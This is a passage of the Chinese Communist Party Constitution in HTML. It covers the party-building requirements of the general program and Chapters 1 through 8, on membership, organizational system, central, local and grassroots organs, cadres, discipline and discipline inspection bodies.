<p>  第一，坚持党的基本路线。全党要用邓小平理论、“三个代表”重要思想、科学发展观、习近平新时代中国特色社会主义思想和党的基本路线统一思想，统一行动，并且毫不动摇地长期坚持下去。必须把改革开放同四项基本原则统一起来，全面落实党的基本路线，反对一切“左”的和右的错误倾向，要警惕右，但主要是防止“左”。必须提高政治判断力、政治领悟力、政治执行力，增强贯彻落实党的理论和路线方针政策的自觉性和坚定性。</p>
<p>  第二，坚持解放思想，实事求是，与时俱进，求真务实。党的思想路线是一切从实际出发，理论联系实际，实事求是，在实践中检验真理和发展真理。全党必须坚持这条思想路线，积极探索，大胆试验，开拓创新，创造性地开展工作，不断研究新情况，总结新经验，解决新问题，在实践中丰富和发展马克思主义，推进马克思主义中国化时代化。</p>
<p>  第三，坚持新时代党的组织路线。全面贯彻习近平新时代中国特色社会主义思想，以组织体系建设为重点，着力培养忠诚干净担当的高素质干部，着力集聚爱国奉献的各方面优秀人才，坚持德才兼备、以德为先、任人唯贤，为坚持和加强党的全面领导、坚持和发展中国特色社会主义提供坚强组织保证。全党必须增强党组织的政治功能和组织功能，培养选拔党和人民需要的好干部，培养和造就大批堪当时代重任的社会主义事业接班人，聚天下英才而用之，从组织上保证党的基本理论、基本路线、基本方略的贯彻落实。</p>
<p>  第四，坚持全心全意为人民服务。党除了工人阶级和最广大人民群众的利益，没有自己特殊的利益。党在任何时候都把群众利益放在第一位，同群众同甘共苦，保持最密切的联系，坚持权为民所用、情为民所系、利为民所谋，不允许任何党员脱离群众，凌驾于群众之上。我们党的最大政治优势是密切联系群众，党执政后的最大危险是脱离群众。党风问题、党同人民群众联系问题是关系党生死存亡的问题。党在自己的工作中实行群众路线，一切为了群众，一切依靠群众，从群众中来，到群众中去，把党的正确主张变为群众的自觉行动。</p>
<p>  第五，坚持民主集中制。民主集中制是民主基础上的集中和集中指导下的民主相结合。它既是党的根本组织原则，也是群众路线在党的生活中的运用。必须充分发扬党内民主，尊重党员主体地位，保障党员民主权利，发挥各级党组织和广大党员的积极性创造性。必须实行正确的集中，牢固树立政治意识、大局意识、核心意识、看齐意识，坚定维护以习近平同志为核心的党中央权威和集中统一领导，保证全党的团结统一和行动一致，保证党的决定得到迅速有效的贯彻执行。加强和规范党内政治生活，增强党内政治生活的政治性、时代性、原则性、战斗性，发展积极健康的党内政治文化，营造风清气正的良好政治生态。党在自己的政治生活中正确地开展批评和自我批评，在原则问题上进行思想斗争，坚持真理，修正错误。努力造成又有集中又有民主，又有纪律又有自由，又有统一意志又有个人心情舒畅生动活泼的政治局面。</p>
<p>  第六，坚持从严管党治党。全面从严治党永远在路上，党的自我革命永远在路上。新形势下，党面临的执政考验、改革开放考验、市场经济考验、外部环境考验是长期的、复杂的、严峻的，精神懈怠危险、能力不足危险、脱离群众危险、消极腐败危险更加尖锐地摆在全党面前。要把严的标准、严的措施贯穿于管党治党全过程和各方面。坚持依规治党、标本兼治，不断健全党内法规体系，坚持把纪律挺在前面，加强组织性纪律性，在党的纪律面前人人平等。强化全面从严治党主体责任和监督责任，加强对党的领导机关和党员领导干部特别是主要领导干部的监督，不断完善党内监督体系。深入推进党风廉政建设和反腐败斗争，以零容忍态度惩治腐败，一体推进不敢腐、不能腐、不想腐。</p>
<p>  中国共产党的领导是中国特色社会主义最本质的特征，是中国特色社会主义制度的最大优势，党是最高政治领导力量。党政军民学，东西南北中，党是领导一切的。党要适应改革开放和社会主义现代化建设的要求，坚持科学执政、民主执政、依法执政，加强和改善党的领导。党必须按照总揽全局、协调各方的原则，在同级各种组织中发挥领导核心作用。党必须集中精力领导经济建设，组织、协调各方面的力量，同心协力，围绕经济建设开展工作，促进经济社会全面发展。党必须实行民主的科学的决策，制定和执行正确的路线、方针、政策，做好党的组织工作和宣传教育工作，发挥全体党员的先锋模范作用。党必须在宪法和法律的范围内活动。党必须保证国家的立法、司法、行政、监察机关，经济、文化组织和人民团体积极主动地、独立负责地、协调一致地工作。党必须加强对工会、共产主义青年团、妇女联合会等群团组织的领导，使它们保持和增强政治性、先进性、群众性，充分发挥作用。党必须适应形势的发展和情况的变化，完善领导体制，改进领导方式，增强执政能力。共产党员必须同党外群众亲密合作，共同为建设中国特色社会主义而奋斗。</p>
<h2 id="第一章-党员"><a href="#第一章-党员" class="headerlink" title="第一章 党员"></a>第一章 党员</h2><p>  <strong>第一条</strong>　年满十八岁的中国工人、农民、军人、知识分子和其他社会阶层的先进分子，承认党的纲领和章程，愿意参加党的一个组织并在其中积极工作、执行党的决议和按期交纳党费的，可以申请加入中国共产党。</p>
<p>  <strong>第二条</strong>　中国共产党党员是中国工人阶级的有共产主义觉悟的先锋战士。</p>
<p>  中国共产党党员必须全心全意为人民服务，不惜牺牲个人的一切，为实现共产主义奋斗终身。</p>
<p>  中国共产党党员永远是劳动人民的普通一员。除了法律和政策规定范围内的个人利益和工作职权以外，所有共产党员都不得谋求任何私利和特权。</p>
<p>  <strong>第三条</strong>　党员必须履行下列义务：</p>
<p>  （一）认真学习马克思列宁主义、毛泽东思想、邓小平理论、“三个代表”重要思想、科学发展观、习近平新时代中国特色社会主义思想，学习党的路线、方针、政策和决议，学习党的基本知识和党的历史，学习科学、文化、法律和业务知识，努力提高为人民服务的本领。</p>
<p>  （二）增强“四个意识”、坚定“四个自信”、做到“两个维护”，贯彻执行党的基本路线和各项方针、政策，带头参加改革开放和社会主义现代化建设，带动群众为经济发展和社会进步艰苦奋斗，在生产、工作、学习和社会生活中起先锋模范作用。</p>
<p>  （三）坚持党和人民的利益高于一切，个人利益服从党和人民的利益，吃苦在前，享受在后，克己奉公，多做贡献。</p>
<p>  （四）自觉遵守党的纪律，首先是党的政治纪律和政治规矩，模范遵守国家的法律法规，严格保守党和国家的秘密，执行党的决定，服从组织分配，积极完成党的任务。</p>
<p>  （五）维护党的团结和统一，对党忠诚老实，言行一致，坚决反对一切派别组织和小集团活动，反对阳奉阴违的两面派行为和一切阴谋诡计。</p>
<p>  （六）切实开展批评和自我批评，勇于揭露和纠正违反党的原则的言行和工作中的缺点、错误，坚决同消极腐败现象作斗争。</p>
<p>  （七）密切联系群众，向群众宣传党的主张，遇事同群众商量，及时向党反映群众的意见和要求，维护群众的正当利益。</p>
<p>  （八）发扬社会主义新风尚，带头实践社会主义核心价值观和社会主义荣辱观，提倡共产主义道德，弘扬中华民族传统美德，为了保护国家和人民的利益，在一切困难和危险的时刻挺身而出，英勇斗争，不怕牺牲。</p>
<p>  <strong>第四条</strong>　党员享有下列权利：</p>
<p>  （一）参加党的有关会议，阅读党的有关文件，接受党的教育和培训。</p>
<p>  （二）在党的会议上和党报党刊上，参加关于党的政策问题的讨论。</p>
<p>  （三）对党的工作提出建议和倡议。</p>
<p>  （四）在党的会议上有根据地批评党的任何组织和任何党员，向党负责地揭发、检举党的任何组织和任何党员违法乱纪的事实，要求处分违法乱纪的党员，要求罢免或撤换不称职的干部。</p>
<p>  （五）行使表决权、选举权，有被选举权。</p>
<p>  （六）在党组织讨论决定对党员的党纪处分或作出鉴定时，本人有权参加和进行申辩，其他党员可以为他作证和辩护。</p>
<p>  （七）对党的决议和政策如有不同意见，在坚决执行的前提下，可以声明保留，并且可以把自己的意见向党的上级组织直至中央提出。</p>
<p>  （八）向党的上级组织直至中央提出请求、申诉和控告，并要求有关组织给以负责的答复。</p>
<p>  党的任何一级组织直至中央都无权剥夺党员的上述权利。</p>
<p>  <strong>第五条</strong>　发展党员，必须把政治标准放在首位，经过党的支部，坚持个别吸收的原则。</p>
<p>  申请入党的人，要填写入党志愿书，要有两名正式党员作介绍人，要经过支部大会通过和上级党组织批准，并且经过预备期的考察，才能成为正式党员。</p>
<p>  介绍人要认真了解申请人的思想、品质、经历和工作表现，向他解释党的纲领和党的章程，说明党员的条件、义务和权利，并向党组织作出负责的报告。</p>
<p>  党的支部委员会对申请入党的人，要注意征求党内外有关群众的意见，进行严格的审查，认为合格后再提交支部大会讨论。</p>
<p>  上级党组织在批准申请人入党以前，要派人同他谈话，作进一步的了解，并帮助他提高对党的认识。</p>
<p>  在特殊情况下，党的中央和省、自治区、直辖市委员会可以直接接收党员。</p>
<p>  <strong>第六条</strong>　预备党员必须面向党旗进行入党宣誓。誓词如下：我志愿加入中国共产党，拥护党的纲领，遵守党的章程，履行党员义务，执行党的决定，严守党的纪律，保守党的秘密，对党忠诚，积极工作，为共产主义奋斗终身，随时准备为党和人民牺牲一切，永不叛党。</p>
<p>  <strong>第七条</strong>　预备党员的预备期为一年。党组织对预备党员应当认真教育和考察。</p>
<p>  预备党员的义务同正式党员一样。预备党员的权利，除了没有表决权、选举权和被选举权以外，也同正式党员一样。</p>
<p>  预备党员预备期满，党的支部应当及时讨论他能否转为正式党员。认真履行党员义务，具备党员条件的，应当按期转为正式党员；需要继续考察和教育的，可以延长预备期，但不能超过一年；不履行党员义务，不具备党员条件的，应当取消预备党员资格。预备党员转为正式党员，或延长预备期，或取消预备党员资格，都应当经支部大会讨论通过和上级党组织批准。</p>
<p>  预备党员的预备期，从支部大会通过他为预备党员之日算起。党员的党龄，从预备期满转为正式党员之日算起。</p>
<p>  <strong>第八条</strong>　每个党员，不论职务高低，都必须编入党的一个支部、小组或其他特定组织，参加党的组织生活，接受党内外群众的监督。党员领导干部还必须参加党委、党组的民主生活会。不允许有任何不参加党的组织生活、不接受党内外群众监督的特殊党员。</p>
<p>  <strong>第九条</strong>　党员有退党的自由。党员要求退党，应当经支部大会讨论后宣布除名，并报上级党组织备案。</p>
<p>  党员缺乏革命意志，不履行党员义务，不符合党员条件，党的支部应当对他进行教育，要求他限期改正；经教育仍无转变的，应当劝他退党。劝党员退党，应当经支部大会讨论决定，并报上级党组织批准。如被劝告退党的党员坚持不退，应当提交支部大会讨论，决定把他除名，并报上级党组织批准。</p>
<p>  党员如果没有正当理由，连续六个月不参加党的组织生活，或不交纳党费，或不做党所分配的工作，就被认为是自行脱党。支部大会应当决定把这样的党员除名，并报上级党组织批准。</p>
<h2 id="第二章-党的组织制度"><a href="#第二章-党的组织制度" class="headerlink" title="第二章 党的组织制度"></a>第二章 党的组织制度</h2><p>  <strong>第十条</strong>　党是根据自己的纲领和章程，按照民主集中制组织起来的统一整体。党的民主集中制的基本原则是：</p>
<p>  （一）党员个人服从党的组织，少数服从多数，下级组织服从上级组织，全党各个组织和全体党员服从党的全国代表大会和中央委员会。</p>
<p>  （二）党的各级领导机关，除它们派出的代表机关和在非党组织中的党组外，都由选举产生。</p>
<p>  （三）党的最高领导机关，是党的全国代表大会和它所产生的中央委员会。党的地方各级领导机关，是党的地方各级代表大会和它们所产生的委员会。党的各级委员会向同级的代表大会负责并报告工作。</p>
<p>  （四）党的上级组织要经常听取下级组织和党员群众的意见，及时解决他们提出的问题。党的下级组织既要向上级组织请示和报告工作，又要独立负责地解决自己职责范围内的问题。上下级组织之间要互通情报、互相支持和互相监督。党的各级组织要按规定实行党务公开，使党员对党内事务有更多的了解和参与。</p>
<p>  （五）党的各级委员会实行集体领导和个人分工负责相结合的制度。凡属重大问题都要按照集体领导、民主集中、个别酝酿、会议决定的原则，由党的委员会集体讨论，作出决定；委员会成员要根据集体的决定和分工，切实履行自己的职责。</p>
<p>  （六）党禁止任何形式的个人崇拜。要保证党的领导人的活动处于党和人民的监督之下，同时维护一切代表党和人民利益的领导人的威信。</p>
<p>  <strong>第十一条</strong>　党的各级代表大会的代表和委员会的产生，要体现选举人的意志。选举采用无记名投票的方式。候选人名单要由党组织和选举人充分酝酿讨论。可以直接采用候选人数多于应选人数的差额选举办法进行正式选举。也可以先采用差额选举办法进行预选，产生候选人名单，然后进行正式选举。选举人有了解候选人情况、要求改变候选人、不选任何一个候选人和另选他人的权利。任何组织和个人不得以任何方式强迫选举人选举或不选举某个人。</p>
<p>  党的地方各级代表大会和基层代表大会的选举，如果发生违反党章的情况，上一级党的委员会在调查核实后，应作出选举无效和采取相应措施的决定，并报再上一级党的委员会审查批准，正式宣布执行。</p>
<p>  党的各级代表大会代表实行任期制。</p>
<p>  <strong>第十二条</strong>　党的中央和地方各级委员会在必要时召集代表会议，讨论和决定需要及时解决的重大问题。代表会议代表的名额和产生办法，由召集代表会议的委员会决定。</p>
<p>  <strong>第十三条</strong>　凡是成立党的新组织，或是撤销党的原有组织，必须由上级党组织决定。</p>
<p>  在党的地方各级代表大会和基层代表大会闭会期间，上级党的组织认为有必要时，可以调动或者指派下级党组织的负责人。</p>
<p>  党的中央和地方各级委员会可以派出代表机关。</p>
<p>  <strong>第十四条</strong>　党的中央和省、自治区、直辖市委员会实行巡视制度，在一届任期内，对所管理的地方、部门、企事业单位党组织实现巡视全覆盖。</p>
<p>  中央有关部委和国家机关部门党组（党委）根据工作需要，开展巡视工作。</p>
<p>  党的市（地、州、盟）和县（市、区、旗）委员会建立巡察制度。</p>
<p>  <strong>第十五条</strong>　党的各级领导机关，对同下级组织有关的重要问题作出决定时，在通常情况下，要征求下级组织的意见。要保证下级组织能够正常行使他们的职权。凡属应由下级组织处理的问题，如无特殊情况，上级领导机关不要干预。</p>
<p>  <strong>第十六条</strong>　有关全国性的重大政策问题，只有党中央有权作出决定，各部门、各地方的党组织可以向中央提出建议，但不得擅自作出决定和对外发表主张。</p>
<p>  党的下级组织必须坚决执行上级组织的决定。下级组织如果认为上级组织的决定不符合本地区、本部门的实际情况，可以请求改变；如果上级组织坚持原决定，下级组织必须执行，并不得公开发表不同意见，但有权向再上一级组织报告。</p>
<p>  党的各级组织的报刊和其他宣传工具，必须宣传党的路线、方针、政策和决议。</p>
<p>  <strong>第十七条</strong>　党组织讨论决定问题，必须执行少数服从多数的原则。决定重要问题，要进行表决。对于少数人的不同意见，应当认真考虑。如对重要问题发生争论，双方人数接近，除了在紧急情况下必须按多数意见执行外，应当暂缓作出决定，进一步调查研究，交换意见，下次再表决；在特殊情况下，也可将争论情况向上级组织报告，请求裁决。</p>
<p>  党员个人代表党组织发表重要主张，如果超出党组织已有决定的范围，必须提交所在的党组织讨论决定，或向上级党组织请示。任何党员不论职务高低，都不能个人决定重大问题；如遇紧急情况，必须由个人作出决定时，事后要迅速向党组织报告。不允许任何领导人实行个人专断和把个人凌驾于组织之上。</p>
<p>  <strong>第十八条</strong>　党的中央、地方和基层组织，都必须重视党的建设，经常讨论和检查党的宣传工作、教育工作、组织工作、纪律检查工作、群众工作、统一战线工作等，注意研究党内外的思想政治状况。</p>
<h2 id="第三章-党的中央组织"><a href="#第三章-党的中央组织" class="headerlink" title="第三章 党的中央组织"></a>第三章 党的中央组织</h2><p>  <strong>第十九条</strong>　党的全国代表大会每五年举行一次，由中央委员会召集。中央委员会认为有必要，或者有三分之一以上的省一级组织提出要求，全国代表大会可以提前举行；如无非常情况，不得延期举行。</p>
<p>  全国代表大会代表的名额和选举办法，由中央委员会决定。</p>
<p>  <strong>第二十条</strong>　党的全国代表大会的职权是：</p>
<p>  （一）听取和审查中央委员会的报告；</p>
<p>  （二）审查中央纪律检查委员会的报告；</p>
<p>  （三）讨论并决定党的重大问题；</p>
<p>  （四）修改党的章程；</p>
<p>  （五）选举中央委员会；</p>
<p>  （六）选举中央纪律检查委员会。</p>
<p>  <strong>第二十一条</strong>　党的全国代表会议的职权是：讨论和决定重大问题；调整和增选中央委员会、中央纪律检查委员会的部分成员。调整和增选中央委员及候补中央委员的数额，不得超过党的全国代表大会选出的中央委员及候补中央委员各自总数的五分之一。</p>
<p>  <strong>第二十二条</strong>　党的中央委员会每届任期五年。全国代表大会如提前或延期举行，它的任期相应地改变。中央委员会委员和候补委员必须有五年以上的党龄。中央委员会委员和候补委员的名额，由全国代表大会决定。中央委员会委员出缺，由中央委员会候补委员按照得票多少依次递补。</p>
<p>  中央委员会全体会议由中央政治局召集，每年至少举行一次。中央政治局向中央委员会全体会议报告工作，接受监督。</p>
<p>  在全国代表大会闭会期间，中央委员会执行全国代表大会的决议，领导党的全部工作，对外代表中国共产党。</p>
<p>  <strong>第二十三条</strong>　党的中央政治局、中央政治局常务委员会和中央委员会总书记，由中央委员会全体会议选举。中央委员会总书记必须从中央政治局常务委员会委员中产生。</p>
<p>  中央政治局和它的常务委员会在中央委员会全体会议闭会期间，行使中央委员会的职权。</p>
<p>  中央书记处是中央政治局和它的常务委员会的办事机构；成员由中央政治局常务委员会提名，中央委员会全体会议通过。</p>
<p>  中央委员会总书记负责召集中央政治局会议和中央政治局常务委员会会议，并主持中央书记处的工作。</p>
<p>  党的中央军事委员会组成人员由中央委员会决定，中央军事委员会实行主席负责制。</p>
<p>  每届中央委员会产生的中央领导机构和中央领导人，在下届全国代表大会开会期间，继续主持党的经常工作，直到下届中央委员会产生新的中央领导机构和中央领导人为止。</p>
<p>  <strong>第二十四条</strong>　中国人民解放军的党组织，根据中央委员会的指示进行工作。中央军事委员会负责军队中党的工作和政治工作，对军队中党的组织体制和机构作出规定。</p>
<h2 id="第四章-党的地方组织"><a href="#第四章-党的地方组织" class="headerlink" title="第四章 党的地方组织"></a>第四章 党的地方组织</h2><p>  <strong>第二十五条</strong>　党的省、自治区、直辖市的代表大会，设区的市和自治州的代表大会，县（旗）、自治县、不设区的市和市辖区的代表大会，每五年举行一次。</p>
<p>  党的地方各级代表大会由同级党的委员会召集。在特殊情况下，经上一级委员会批准，可以提前或延期举行。</p>
<p>  党的地方各级代表大会代表的名额和选举办法，由同级党的委员会决定，并报上一级党的委员会批准。</p>
<p>  <strong>第二十六条</strong>　党的地方各级代表大会的职权是：</p>
<p>  （一）听取和审查同级委员会的报告；</p>
<p>  （二）审查同级纪律检查委员会的报告；</p>
<p>  （三）讨论本地区范围内的重大问题并作出决议；</p>
<p>  （四）选举同级党的委员会，选举同级党的纪律检查委员会。</p>
<p>  <strong>第二十七条</strong>　党的省、自治区、直辖市、设区的市和自治州的委员会，每届任期五年。这些委员会的委员和候补委员必须有五年以上的党龄。</p>
<p>  党的县（旗）、自治县、不设区的市和市辖区的委员会，每届任期五年。这些委员会的委员和候补委员必须有三年以上的党龄。</p>
<p>  党的地方各级代表大会如提前或延期举行，由它选举的委员会的任期相应地改变。</p>
<p>  党的地方各级委员会的委员和候补委员的名额，分别由上一级委员会决定。党的地方各级委员会委员出缺，由候补委员按照得票多少依次递补。</p>
<p>  党的地方各级委员会全体会议，每年至少召开两次。</p>
<p>  党的地方各级委员会在代表大会闭会期间，执行上级党组织的指示和同级党代表大会的决议，领导本地方的工作，定期向上级党的委员会报告工作。</p>
<p>  <strong>第二十八条</strong>　党的地方各级委员会全体会议，选举常务委员会和书记、副书记，并报上级党的委员会批准。党的地方各级委员会的常务委员会，在委员会全体会议闭会期间，行使委员会职权；在下届代表大会开会期间，继续主持经常工作，直到新的常务委员会产生为止。</p>
<p>  党的地方各级委员会的常务委员会定期向委员会全体会议报告工作，接受监督。</p>
<p>  <strong>第二十九条</strong>　党的地区委员会和相当于地区委员会的组织，是党的省、自治区委员会在几个县、自治县、市范围内派出的代表机关。它根据省、自治区委员会的授权，领导本地区的工作。</p>
<h2 id="第五章-党的基层组织"><a href="#第五章-党的基层组织" class="headerlink" title="第五章 党的基层组织"></a>第五章 党的基层组织</h2><p>  <strong>第三十条</strong>　企业、农村、机关、学校、医院、科研院所、街道社区、社会组织、人民解放军连队和其他基层单位，凡是有正式党员三人以上的，都应当成立党的基层组织。</p>
<p>  党的基层组织，根据工作需要和党员人数，经上级党组织批准，分别设立党的基层委员会、总支部委员会、支部委员会。基层委员会由党员大会或代表大会选举产生，总支部委员会和支部委员会由党员大会选举产生，提出委员候选人要广泛征求党员和群众的意见。</p>
<p>  <strong>第三十一条</strong>　党的基层委员会、总支部委员会、支部委员会每届任期三年至五年。基层委员会、总支部委员会、支部委员会的书记、副书记选举产生后，应报上级党组织批准。</p>
<p>  <strong>第三十二条</strong>　党的基层组织是党在社会基层组织中的战斗堡垒，是党的全部工作和战斗力的基础。它的基本任务是：</p>
<p>  （一）宣传和执行党的路线、方针、政策，宣传和执行党中央、上级组织和本组织的决议，充分发挥党员的先锋模范作用，积极创先争优，团结、组织党内外的干部和群众，努力完成本单位所担负的任务。</p>
<p>  （二）组织党员认真学习马克思列宁主义、毛泽东思想、邓小平理论、“三个代表”重要思想、科学发展观、习近平新时代中国特色社会主义思想，推进“两学一做”学习教育、党史学习教育常态化制度化，学习党的路线、方针、政策和决议，学习党的基本知识，学习科学、文化、法律和业务知识。</p>
<p>  （三）对党员进行教育、管理、监督和服务，提高党员素质，坚定理想信念，增强党性，严格党的组织生活，开展批评和自我批评，维护和执行党的纪律，监督党员切实履行义务，保障党员的权利不受侵犯。加强和改进流动党员管理。</p>
<p>  （四）密切联系群众，经常了解群众对党员、党的工作的批评和意见，维护群众的正当权利和利益，做好群众的思想政治工作。</p>
<p>  （五）充分发挥党员和群众的积极性创造性，发现、培养和推荐他们中间的优秀人才，鼓励和支持他们在改革开放和社会主义现代化建设中贡献自己的聪明才智。</p>
<p>  （六）对要求入党的积极分子进行教育和培养，做好经常性的发展党员工作，重视在生产、工作第一线和青年中发展党员。</p>
<p>  （七）监督党员干部和其他任何工作人员严格遵守国家法律法规，严格遵守国家的财政经济法规和人事制度，不得侵占国家、集体和群众的利益。</p>
<p>  （八）教育党员和群众自觉抵制不良倾向，坚决同各种违纪违法行为作斗争。</p>
<p>  <strong>第三十三条</strong>　街道、乡、镇党的基层委员会和村、社区党组织，统一领导本地区基层各类组织和各项工作，加强基层社会治理，支持和保证行政组织、经济组织和群众性自治组织充分行使职权。</p>
<p>  国有企业党委（党组）发挥领导作用，把方向、管大局、保落实，依照规定讨论和决定企业重大事项。国有企业和集体企业中党的基层组织，围绕企业生产经营开展工作。保证监督党和国家的方针、政策在本企业的贯彻执行；支持股东会、董事会、监事会和经理（厂长）依法行使职权；全心全意依靠职工群众，支持职工代表大会开展工作；参与企业重大问题的决策；加强党组织的自身建设，领导思想政治工作、精神文明建设、统一战线工作和工会、共青团、妇女组织等群团组织。</p>
<p>  非公有制经济组织中党的基层组织，贯彻党的方针政策，引导和监督企业遵守国家的法律法规，领导工会、共青团等群团组织，团结凝聚职工群众，维护各方的合法权益，促进企业健康发展。</p>
<p>  社会组织中党的基层组织，宣传和执行党的路线、方针、政策，领导工会、共青团等群团组织，教育管理党员，引领服务群众，推动事业发展。</p>
<p>  实行行政领导人负责制的事业单位中党的基层组织，发挥战斗堡垒作用。实行党委领导下的行政领导人负责制的事业单位中党的基层组织，对重大问题进行讨论和作出决定，同时保证行政领导人充分行使自己的职权。</p>
<p>  各级党和国家机关中党的基层组织，协助行政负责人完成任务，改进工作，对包括行政负责人在内的每个党员进行教育、管理、监督，不领导本单位的业务工作。</p>
<p>  <strong>第三十四条</strong>　党支部是党的基础组织，担负直接教育党员、管理党员、监督党员和组织群众、宣传群众、凝聚群众、服务群众的职责。</p>
<h2 id="第六章-党的干部"><a href="#第六章-党的干部" class="headerlink" title="第六章 党的干部"></a>第六章 党的干部</h2><p>  <strong>第三十五条</strong>　党的干部是党的事业的骨干，是人民的公仆，要做到忠诚干净担当。党按照德才兼备、以德为先的原则选拔干部，坚持五湖四海、任人唯贤，坚持事业为上、公道正派，反对任人唯亲，努力实现干部队伍的革命化、年轻化、知识化、专业化。</p>
<p>  党重视教育、培训、选拔、考核和监督干部，特别是培养、选拔优秀年轻干部。积极推进干部制度改革。</p>
<p>  党重视培养、选拔女干部和少数民族干部。</p>
<p>  <strong>第三十六条</strong>　党的各级领导干部必须信念坚定、为民服务、勤政务实、敢于担当、清正廉洁，模范地履行本章程第三条所规定的党员的各项义务，并且必须具备以下的基本条件：</p>
<p>  （一）具有履行职责所需要的马克思列宁主义、毛泽东思想、邓小平理论、“三个代表”重要思想、科学发展观的水平，带头贯彻落实习近平新时代中国特色社会主义思想，努力用马克思主义的立场、观点、方法分析和解决实际问题，坚持讲学习、讲政治、讲正气，经得起各种风浪的考验。</p>
<p>  （二）具有共产主义远大理想和中国特色社会主义坚定信念，坚决执行党的基本路线和各项方针、政策，立志改革开放，献身现代化事业，在社会主义建设中艰苦创业，树立正确政绩观，做出经得起实践、人民、历史检验的实绩。</p>
<p>  （三）坚持解放思想，实事求是，与时俱进，开拓创新，认真调查研究，能够把党的方针、政策同本地区、本部门的实际相结合，卓有成效地开展工作，讲实话，办实事，求实效。</p>
<p>  （四）有强烈的革命事业心和政治责任感，有实践经验，有胜任领导工作的组织能力、文化水平和专业知识。</p>
<p>  （五）正确行使人民赋予的权力，坚持原则，依法办事，清正廉洁，勤政为民，以身作则，艰苦朴素，密切联系群众，坚持党的群众路线，自觉地接受党和群众的批评和监督，加强道德修养，讲党性、重品行、作表率，做到自重、自省、自警、自励，反对形式主义、官僚主义、享乐主义和奢靡之风，反对特权思想和特权现象，反对任何滥用职权、谋求私利的行为。</p>
<p>  （六）坚持和维护党的民主集中制，有民主作风，有全局观念，善于团结同志，包括团结同自己有不同意见的同志一道工作。</p>
<p>  <strong>第三十七条</strong>　党员干部要善于同党外干部合作共事，尊重他们，虚心学习他们的长处。</p>
<p>  党的各级组织要善于发现和推荐有真才实学的党外干部担任领导工作，保证他们有职有权，充分发挥他们的作用。</p>
<p>  <strong>第三十八条</strong>　党的各级领导干部，无论是由民主选举产生的，或是由领导机关任命的，他们的职务都不是终身的，都可以变动或解除。</p>
<p>  年龄和健康状况不适宜于继续担任工作的干部，应当按照国家的规定退、离休。</p>
<h2 id="第七章-党的纪律"><a href="#第七章-党的纪律" class="headerlink" title="第七章 党的纪律"></a>第七章 党的纪律</h2><p>  <strong>第三十九条</strong>　党的纪律是党的各级组织和全体党员必须遵守的行为规则，是维护党的团结统一、完成党的任务的保证。党组织必须严格执行和维护党的纪律，共产党员必须自觉接受党的纪律的约束。</p>
<p>  <strong>第四十条</strong>　党的纪律主要包括政治纪律、组织纪律、廉洁纪律、群众纪律、工作纪律、生活纪律。</p>
<p>  坚持惩前毖后、治病救人，执纪必严、违纪必究，抓早抓小、防微杜渐，按照错误性质和情节轻重，给以批评教育、责令检查、诫勉直至纪律处分。运用监督执纪“四种形态”，让“红红脸、出出汗”成为常态，党纪处分、组织调整成为管党治党的重要手段，严重违纪、严重触犯刑律的党员必须开除党籍。</p>
<p>  党内严格禁止用违反党章和国家法律的手段对待党员，严格禁止打击报复和诬告陷害。违反这些规定的组织或个人必须受到党的纪律和国家法律的追究。</p>
<p>  <strong>第四十一条</strong>　对党员的纪律处分有五种：警告、严重警告、撤销党内职务、留党察看、开除党籍。</p>
<p>  留党察看最长不超过两年。党员在留党察看期间没有表决权、选举权和被选举权。党员经过留党察看，确已改正错误的，应当恢复其党员的权利；坚持错误不改的，应当开除党籍。</p>
<p>  开除党籍是党内的最高处分。各级党组织在决定或批准开除党员党籍的时候，应当全面研究有关的材料和意见，采取十分慎重的态度。</p>
<p>  <strong>第四十二条</strong>　对党员的纪律处分，必须经过支部大会讨论决定，报党的基层委员会批准；如果涉及的问题比较重要或复杂，或给党员以开除党籍的处分，应分别不同情况，报县级或县级以上党的纪律检查委员会审查批准。在特殊情况下，县级和县级以上各级党的委员会和纪律检查委员会有权直接决定给党员以纪律处分。</p>
<p>  对党的中央委员会委员、候补委员，给以警告、严重警告处分，由中央纪律检查委员会常务委员会审议后，报党中央批准。对地方各级党的委员会委员、候补委员，给以警告、严重警告处分，应由上一级纪律检查委员会批准，并报它的同级党的委员会备案。</p>
<p>  对党的中央委员会和地方各级委员会的委员、候补委员，给以撤销党内职务、留党察看或开除党籍的处分，必须由本人所在的委员会全体会议三分之二以上的多数决定。在全体会议闭会期间，可以先由中央政治局和地方各级委员会常务委员会作出处理决定，待召开委员会全体会议时予以追认。对地方各级委员会委员和候补委员的上述处分，必须经过上级纪律检查委员会常务委员会审议，由这一级纪律检查委员会报同级党的委员会批准。</p>
<p>  严重触犯刑律的中央委员会委员、候补委员，由中央政治局决定开除其党籍；严重触犯刑律的地方各级委员会委员、候补委员，由同级委员会常务委员会决定开除其党籍。</p>
<p>  <strong>第四十三条</strong>　党组织对党员作出处分决定，应当实事求是地查清事实。处分决定所依据的事实材料和处分决定必须同本人见面，听取本人说明情况和申辩。如果本人对处分决定不服，可以提出申诉，有关党组织必须负责处理或者迅速转递，不得扣压。对于确属坚持错误意见和无理要求的人，要给以批评教育。</p>
<p>  <strong>第四十四条</strong>　党组织如果在维护党的纪律方面失职，必须问责。</p>
<p>  对于严重违犯党的纪律、本身又不能纠正的党组织，上一级党的委员会在查明核实后，应根据情节严重的程度，作出进行改组或予以解散的决定，并报再上一级党的委员会审查批准，正式宣布执行。</p>
<h2 id="第八章-党的纪律检查机关"><a href="#第八章-党的纪律检查机关" class="headerlink" title="第八章 党的纪律检查机关"></a>第八章 党的纪律检查机关</h2><p>  <strong>第四十五条</strong>　党的中央纪律检查委员会在党的中央委员会领导下进行工作。党的地方各级纪律检查委员会和基层纪律检查委员会在同级党的委员会和上级纪律检查委员会双重领导下进行工作。上级党的纪律检查委员会加强对下级纪律检查委员会的领导。</p>
<p>  党的各级纪律检查委员会每届任期和同级党的委员会相同。</p>
<p>  党的中央纪律检查委员会全体会议，选举常务委员会和书记、副书记，并报党的中央委员会批准。党的地方各级纪律检查委员会全体会议，选举常务委员会和书记、副书记，并由同级党的委员会通过，报上级党的委员会批准。党的基层委员会是设立纪律检查委员会，还是设立纪律检查委员，由它的上一级党组织根据具体情况决定。党的总支部委员会和支部委员会设纪律检查委员。</p>
<p>  党的中央和地方纪律检查委员会向同级党和国家机关全面派驻党的纪律检查组，按照规定向有关国有企业、事业单位派驻党的纪律检查组。纪律检查组组长参加驻在单位党的领导组织的有关会议。他们的工作必须受到该单位党的领导组织的支持。</p>
